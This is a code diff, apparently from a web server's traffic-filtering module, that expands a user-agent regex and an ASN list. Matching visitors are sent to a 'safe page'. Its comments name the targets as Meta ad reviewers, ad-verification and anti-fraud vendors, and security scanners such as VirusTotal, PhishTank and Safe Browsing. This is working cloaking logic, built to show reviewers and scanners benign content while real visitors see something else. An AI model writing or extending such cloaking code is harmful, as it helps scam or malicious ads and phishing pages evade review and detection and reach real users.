@@ -14,9 +14,77 @@ let localEnvLoaded = false;
 const SNIPPET_CACHE: { items: Snip[]; expires: number } = { items: [], expires: 0 };
 const SNIPPET_TTL_MS = 120_000;
 
-const HARD_BOT_UA =
-  /facebookexternalhit|facebookcatalog|facebot|meta-externalagent|meta-externalfetcher|metafetcher|whatsapp|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|pinterest|skypeuripreview|googlebot|bingbot|yandexbot|duckduckbot|baiduspider|applebot|petalbot|semrushbot|ahrefsbot|mj12bot|dotbot|headlesschrome|phantomjs|puppeteer|playwright|chrome-lighthouse|curl|wget|python-requests|httpclient|axios\/|go-http-client|java\/|okhttp|node-fetch/i;
-const META_ASNS = new Set(["32934", "63293", "54115", "149642"]);
+// ---------------------------------------------------------------------------
+// HARD BOT UA — the ONLY UA layer that can force a visitor to the safe page.
+// Grouped so it stays auditable. Every entry is a non-human agent: no real
+// Chrome/Safari/Firefox/in-app browser UA can match any of these tokens.
+// ---------------------------------------------------------------------------
+const HARD_BOT_UA = new RegExp(
+  [
+    // --- Meta / Facebook / Instagram / WhatsApp (ad review + link preview) ---
+    "facebookexternalhit", "facebookcatalog", "facebookscraper", "facebookplatform",
+    "facebookbot", "facebookads", "facebook_ads", "facebot", "fbav_crawler",
+    "meta-externalagent", "meta-externalfetcher", "metafetcher", "meta-crawler",
+    "metainspector", "instagram\\s?bot", "whatsapp",
+    // --- other social / messenger previewers ---
+    "telegrambot", "slackbot", "slack-imgproxy", "discordbot", "twitterbot",
+    "linkedinbot", "pinterest(bot)?", "redditbot", "tumblr", "vkshare", "viber",
+    "line-?podcast", "skypeuripreview", "snapchat", "tiktok", "bytedance",
+    "quora link preview", "flipboard", "nuzzel", "outbrain", "taboola",
+    "embedly", "iframely", "w3c_validator", "developers\\.google\\.com/\\+/web/snippet",
+    // --- search engines ---
+    "googlebot", "google-inspectiontool", "google-read-aloud", "googleother",
+    "google-extended", "storebot-google", "adsbot-google", "mediapartners-google",
+    "feedfetcher-google", "apis-google", "bingbot", "bingpreview", "adidxbot",
+    "msnbot", "yandex(bot|images|mobilebot)?", "duckduckbot", "duckduckgo",
+    "baiduspider", "sogou", "exabot", "seznambot", "naver", "coccocbot",
+    "applebot", "petalbot", "qwantify", "gigabot", "ia_archiver", "archive\\.org_bot",
+    // --- SEO / marketing crawlers ---
+    "semrushbot", "ahrefsbot", "ahrefssiteaudit", "mj12bot", "dotbot", "rogerbot",
+    "screaming frog", "sitebulb", "blexbot", "seokicks", "serpstatbot", "dataforseo",
+    "megaindex", "linkdexbot", "spbot", "zoominfobot", "netcraftsurveyagent",
+    "barkrowler", "cocolyzebot", "seostar", "sistrix", "similartech", "builtwith",
+    // --- AI / LLM crawlers ---
+    "gptbot", "oai-searchbot", "chatgpt-user", "claudebot", "claude-web", "anthropic-ai",
+    "perplexitybot", "youbot", "ccbot", "bytespider", "amazonbot", "applebot-extended",
+    "diffbot", "omgili", "img2dataset", "timpibot", "cohere-ai",
+    // --- ad-verification / compliance / anti-fraud vendors (ad-reject risk) ---
+    "geoedge", "adsecure", "confiant", "clean\\.io", "cleanad", "thebrowser\\.io",
+    "integralads", "iasbot", "doubleverify", "dvbot", "moatbot", "pixalate",
+    "forensiq", "anura", "trafficguard", "adloox", "protectmedia", "fraudlogix",
+    "whiteops", "humansecurity", "adlibrary", "adscanner", "brandverity",
+    "trustpid", "riskiq", "domaintools",
+    // --- security scanners / sandboxes ---
+    "virustotal", "urlscan", "phishtank", "safebrowsing", "sucuri", "netcraft",
+    "qualys", "nessus", "openvas", "acunetix", "nikto", "zgrab", "masscan",
+    "censys", "shodan", "internet-measurement", "paloaltonetworks", "zscaler",
+    "trendmicro", "kaspersky", "avast", "bitdefender", "webshield", "cyberpatrol",
+    // --- headless / automation ---
+    "headlesschrome", "headless", "phantomjs", "electron", "puppeteer", "playwright",
+    "selenium", "webdriver", "cypress", "chrome-lighthouse", "pagespeed",
+    "gtmetrix", "webpagetest", "browserless", "splash", "htmlunit", "jsdom",
+    "prerender", "rendertron", "cheerio",
+    // --- HTTP clients / libraries ---
+    "curl", "wget", "libwww", "lwp::simple", "python-requests", "python-urllib",
+    "python-httpx", "aiohttp", "scrapy", "mechanize", "httpclient", "http_request",
+    "axios\\/", "got\\/", "undici", "node-fetch", "go-http-client", "java\\/",
+    "jakarta", "okhttp", "apache-httpclient", "restsharp", "guzzlehttp", "php",
+    "ruby", "perl", "powershell", "dart\\/", "postman", "insomnia", "httpie",
+    "haskell", "rust-reqwest", "c#", "\\.net clr",
+    // --- monitoring / uptime / feed / misc ---
+    "uptimerobot", "pingdom", "statuscake", "site24x7", "newrelicpinger",
+    "datadog", "nagios", "zabbix", "monitis", "hetrixtool", "betteruptime",
+    "feedly", "feedburner", "rssbot", "superfeedr", "newsblur",
+    "lighthouse", "chrome privacy preserving", "wappalyzer", "cloudflare-traffic-manager",
+    "ltx71", "researchscan", "yacybot",
+    // --- generic catch-all (never present in real browser UAs) ---
+    "crawler", "crawling", "spider", "scraper", "scraping", "fetcher", "indexer",
+    "\\bbot\\b", "[a-z0-9_.-]bot[/ ]", "bot$", "robot",
+  ].join("|"),
+  "i",
+);
+const META_ASNS = new Set(["32934", "63293", "54115", "149642", "394192"]);
+
 const DC_ASNS = new Set([
   "16509",
   "14618",
